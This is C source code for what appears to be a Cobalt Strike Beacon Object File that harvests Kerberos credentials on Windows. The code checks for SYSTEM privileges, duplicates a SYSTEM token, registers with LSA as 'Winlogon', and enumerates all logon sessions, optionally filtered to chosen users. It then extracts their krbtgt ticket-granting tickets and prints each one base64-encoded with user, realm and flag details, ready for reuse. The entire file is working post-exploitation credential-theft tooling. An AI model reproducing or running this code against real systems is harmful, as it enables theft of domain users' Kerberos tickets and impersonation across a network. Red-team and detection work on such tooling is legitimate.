#include <windows.h>
#include "beacon.h"
#include "common.h"

BOOL IsSystem() {
    BOOL isSystem = FALSE;

    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID systemSid = NULL;
    ADVAPI32$AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,0,0,0,0,0,0,0, &systemSid);

    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken))
        return FALSE;

    DWORD retLen = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &retLen);
    TOKEN_USER* tokenUser = (TOKEN_USER*)MemAlloc(retLen);
    if (!tokenUser) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    if (ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, retLen, &retLen)) {
        isSystem = ADVAPI32$EqualSid(tokenUser->User.Sid, systemSid);
        ADVAPI32$FreeSid(systemSid);
    }

    MemFree(tokenUser);
    KERNEL32$CloseHandle(hToken);
    return isSystem;
}

HANDLE StealSystemToken() {
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID systemSid = NULL;
    ADVAPI32$AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,0,0,0,0,0,0,0, &systemSid);

    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD pid = KERNEL32$GetCurrentProcessId();
    HANDLE hDuplicateToken = NULL;

    THREADENTRY32 thEntry = { sizeof(thEntry) };
    if (KERNEL32$Thread32First(hSnap, &thEntry)) {
        do {
            if (thEntry.th32OwnerProcessID != pid)
                continue;

            HANDLE hThread = KERNEL32$OpenThread(THREAD_QUERY_INFORMATION, FALSE, thEntry.th32ThreadID);
            if (!hThread)
                continue;

            HANDLE hToken = NULL;
            if (ADVAPI32$OpenThreadToken(hThread, TOKEN_DUPLICATE | TOKEN_QUERY, FALSE, &hToken)) {
                DWORD retLen = 0;
                ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &retLen);
                TOKEN_USER* tokenUser = (TOKEN_USER*)MemAlloc(retLen);
                if (tokenUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, retLen, &retLen)) {
                    if (ADVAPI32$EqualSid(tokenUser->User.Sid, systemSid)) {
                        ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicateToken);
                    }
                    MemFree(tokenUser);
                }
                KERNEL32$CloseHandle(hToken);
            }
            KERNEL32$CloseHandle(hThread);
        } while (!hDuplicateToken && KERNEL32$Thread32Next(hSnap, &thEntry));
    }

    KERNEL32$CloseHandle(hSnap);
    ADVAPI32$FreeSid(systemSid);
    return hDuplicateToken;
}

NTSTATUS GetLsaHandle(HANDLE* hLsa) {
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hLsaLocal = NULL;
    LSA_OPERATIONAL_MODE mode = 0;

    LSA_STRING lsaString = { .Buffer = "Winlogon", .Length = 8, .MaximumLength = 9 };
    status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaRegisterLogonProcess failed.\n");
        return status;
    }

    *hLsa = hLsaLocal;
    return STATUS_SUCCESS;
}

BOOL IsTargetUser(const char* targetUsers, const char* username) {
    const char* p = targetUsers;
    while (*p) {
        const char* start = p;
        while (*p && *p != ',') p++;
        int len = (int)(p - start);
        char token[256] = { 0 };
        if (len > 0 && len < (int)sizeof(token)) {
            MSVCRT$memcpy(token, start, len);
            if (MSVCRT$_stricmp(token, username) == 0)
                return TRUE;
        }
        if (*p == ',') p++;
    }
    return FALSE;
}

BOOL IsTargetLuid(const char* targetLuids, LUID luid) {
    const char* p = targetLuids;
    while (*p) {
        const char* start = p;
        while (*p && *p != ',') p++;

        char* end = NULL;
        ULONG parsed = MSVCRT$strtoul(start, &end, 16);
        if (end > start && parsed == luid.LowPart)
            return TRUE;

        if (*p == ',') p++;
    }
    return FALSE;
}

NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING target, PUCHAR* ticket, PULONG ticketSize) {
    NTSTATUS status = STATUS_SUCCESS;
    NTSTATUS protocolStatus = STATUS_SUCCESS;
    KERB_RETRIEVE_TKT_REQUEST* request = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* response = NULL;
    ULONG requestSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + target.MaximumLength;
    ULONG responseSize = 0;

    request = (KERB_RETRIEVE_TKT_REQUEST*)MemAlloc(requestSize);
    if (!request)
        return STATUS_MEMORY_NOT_ALLOCATED;

    request->MessageType        = KerbRetrieveEncodedTicketMessage;
    request->LogonId            = luid;
    request->TicketFlags        = 0;
    request->CacheOptions       = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    request->EncryptionType     = 0;
    request->TargetName         = target;
    request->TargetName.Buffer  = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(request->TargetName.Buffer, target.Buffer, target.MaximumLength);

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID*)&response, &responseSize, &protocolStatus);
    MemFree(request);

    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus) || responseSize == 0) {
        if (response)
            SECUR32$LsaFreeReturnBuffer(response);
        return NT_SUCCESS(status) ? protocolStatus : status;
    }

    *ticketSize = response->Ticket.EncodedTicketSize;
    *ticket = (PUCHAR)MemAlloc(*ticketSize);
    if (!*ticket) {
        SECUR32$LsaFreeReturnBuffer(response);
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    MSVCRT$memcpy(*ticket, response->Ticket.EncodedTicket, *ticketSize);
    SECUR32$LsaFreeReturnBuffer(response);
    return STATUS_SUCCESS;
}

NTSTATUS EnumerateTGTs(HANDLE hLsa, ULONG authPackage, char* targetUsers, PTICKET_CACHE cache) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG sessionCount = 0;
    PLUID sessionList  = NULL;
    cache->tickets = NULL;
    cache->count   = 0;

    status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList);
    if (!NT_SUCCESS(status))
        return status;

    cache->tickets = (PTICKET_ENTRY)MemAlloc(sessionCount * 64 * sizeof(TICKET_ENTRY));
    if (!cache->tickets) {
        SECUR32$LsaFreeReturnBuffer(sessionList);
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    for (ULONG i = 0; i < sessionCount; i++) {
        PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
        status = SECUR32$LsaGetLogonSessionData(&sessionList[i], &sessionData);
        if (!NT_SUCCESS(status) || !sessionData)
            continue;

        if (targetUsers && targetUsers[0] != '\0') {
            char username[256] = { 0 };
            if (sessionData->UserName.Buffer && sessionData->UserName.Length > 0)
                KERNEL32$WideCharToMultiByte(CP_ACP, 0, sessionData->UserName.Buffer, sessionData->UserName.Length / 2, username, sizeof(username), NULL, NULL);

            if (!IsTargetUser(targetUsers, username)) {
                SECUR32$LsaFreeReturnBuffer(sessionData);
                continue;
            }
        }

        KERB_QUERY_TKT_CACHE_REQUEST request = { .MessageType = KerbQueryTicketCacheExMessage, .LogonId = sessionData->LogonId };
        SECUR32$LsaFreeReturnBuffer(sessionData);

        KERB_QUERY_TKT_CACHE_EX_RESPONSE* response = NULL;
        ULONG responseSize = 0;
        NTSTATUS protoStatus = 0;

        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &request, sizeof(request), (PVOID*)&response, &responseSize, &protoStatus);
        if (!NT_SUCCESS(status) || !response)
            continue;

        for (ULONG j = 0; j < response->CountOfTickets; j++) {
            // https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Security/Authentication/Identity/struct.KERB_TICKET_CACHE_INFO_EX.html
            KERB_TICKET_CACHE_INFO_EX* t = &response->Tickets[j];

            if (MSVCRT$wcsncmp(t->ServerName.Buffer, L"krbtgt/", 7) != 0)
                continue;

            PTICKET_ENTRY entry = &cache->tickets[cache->count++];
            entry->luid           = sessionList[i];
            entry->startTime      = t->StartTime;
            entry->endTime        = t->EndTime;
            entry->renewUntil     = t->RenewTime;
            entry->ticketFlags    = t->TicketFlags;
            entry->encryptionType = t->EncryptionType;
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerName.Buffer, t->ServerName.Length / 2, entry->spn,          sizeof(entry->spn),          NULL, NULL);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ClientName.Buffer, t->ClientName.Length / 2, entry->clientName,   sizeof(entry->clientName),   NULL, NULL);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ClientRealm.Buffer, t->ClientRealm.Length / 2, entry->clientRealm, sizeof(entry->clientRealm),  NULL, NULL);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerRealm.Buffer, t->ServerRealm.Length / 2, entry->serverRealm, sizeof(entry->serverRealm),  NULL, NULL);
            break;
        }
        SECUR32$LsaFreeReturnBuffer(response);
    }

    SECUR32$LsaFreeReturnBuffer(sessionList);
    return STATUS_SUCCESS;
}

VOID PrintTime(LARGE_INTEGER* li) {
    LARGE_INTEGER localTime = { 0 };
    TIME_FIELDS tf = { 0 };
    NTDLL$RtlSystemTimeToLocalTime(li, &localTime);
    NTDLL$RtlTimeToTimeFields(&localTime, &tf);
    BeaconPrintf(CALLBACK_OUTPUT, "%02d-%02d-%02d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
}

static const FLAG_ENTRY kerbFlags[] = {
    { reserved,          "reserved"           },
    { forwardable,       "forwardable"        },
    { forwarded,         "forwarded"          },
    { proxiable,         "proxiable"          },
    { proxy,             "proxy"              },
    { may_postdate,      "may_postdate"       },
    { postdated,         "postdated"          },
    { invalid,           "invalid"            },
    { renewable,         "renewable"          },
    { initial,           "initial"            },
    { pre_authent,       "pre_authent"        },
    { hw_authent,        "hw_authent"         },
    { ok_as_delegate,    "ok_as_delegate"     },
    { anonymous,         "anonymous"          },
    { name_canonicalize, "name_canonicalize"  },
    { enc_pa_rep,        "enc_pa_rep"         },
    { reserved1,         "reserved1"          },
};

static const char* GetEncType(LONG encType) {
    switch (encType) {
        case des_cbc_crc:          return "des-cbc-crc";
        case des_cbc_md4:          return "des-cbc-md4";
        case des_cbc_md5:          return "des-cbc-md5";
        case des3_cbc_md5:         return "des3-cbc-md5";
        case des3_cbc_sha1:        return "des3-cbc-sha1";
        case aes128_cts_hmac_sha1: return "aes128-cts-hmac-sha1-96";
        case aes256_cts_hmac_sha1: return "aes256-cts-hmac-sha1-96";
        case rc4_hmac:             return "rc4-hmac";
        case rc4_hmac_exp:         return "rc4-hmac-exp";
        default:                   return "unknown";
    }
}

VOID PrintTicketInformation(PTICKET_ENTRY entry, const char* label) {
    SYSTEMTIME now;
    KERNEL32$GetLocalTime(&now);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %02d-%02d-%02d %02d:%02d:%02d - %s:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond, label);

    char user[512] = { 0 };
    MSVCRT$_snprintf(user, sizeof(user) - 1, "%s @ %s", entry->clientName, entry->clientRealm);
    BeaconPrintf(CALLBACK_OUTPUT, "  User           :  %s\n", user);
    BeaconPrintf(CALLBACK_OUTPUT, "  LogonId        :  0x%lx\n", entry->luid.LowPart);
    if (MSVCRT$strcmp(entry->clientRealm, entry->serverRealm) != 0)
        BeaconPrintf(CALLBACK_OUTPUT, "  ServerRealm    :  %s\n", entry->serverRealm);
    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  "); PrintTime(&entry->startTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  "); PrintTime(&entry->endTime);   BeaconPrintf(CALLBACK_OUTPUT, "\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  RenewUntil     :  "); PrintTime(&entry->renewUntil); BeaconPrintf(CALLBACK_OUTPUT, "\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  EncType        :  %s\n", GetEncType(entry->encryptionType));

    UINT flags = entry->ticketFlags;
    BOOL first = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "  Flags          :  ");
    for (int k = 0; k < (int)(sizeof(kerbFlags) / sizeof(kerbFlags[0])); k++) {
        if (flags & kerbFlags[k].mask) {
            BeaconPrintf(CALLBACK_OUTPUT, first ? "%s" : ", %s", kerbFlags[k].name);
            first = FALSE;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  EncodedTicket  :  ");
}

VOID PrintTicket(PBYTE ticket, ULONG ticketSize) {
    const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    ULONG b64Len = ((ticketSize + 2) / 3) * 4 + 1;
    char* b64 = MemAlloc(b64Len);
    if (!b64) return;

    ULONG i = 0, j = 0;
    while (i < ticketSize) {
        ULONG rem = ticketSize - i;
        BYTE  b0  = ticket[i++];
        BYTE  b1  = rem > 1 ? ticket[i++] : 0;
        BYTE  b2  = rem > 2 ? ticket[i++] : 0;
        b64[j++] = b64chars[b0 >> 2];
        b64[j++] = b64chars[((b0 & 3) << 4) | (b1 >> 4)];
        b64[j++] = rem > 1 ? b64chars[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
        b64[j++] = rem > 2 ? b64chars[b2 & 0x3F] : '=';
    }
    b64[j] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "%s\n\n", b64);
    MemFree(b64);
}
